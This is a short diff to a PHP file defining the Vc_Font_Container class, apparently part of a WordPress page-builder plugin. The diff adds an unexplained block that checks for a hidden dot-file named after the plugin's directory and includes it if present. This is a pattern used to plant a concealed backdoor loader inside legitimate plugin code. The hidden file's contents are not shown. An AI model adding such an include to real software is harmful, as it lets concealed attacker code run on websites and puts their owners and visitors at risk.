@@ -30,6 +30,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  *  Ordering of fields, font_family, tag, text_align and etc. will be Same as ordering in array!
  *  To provide default value to field use 'key' => 'value'
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Vc_Font_Container {
 
 	/**
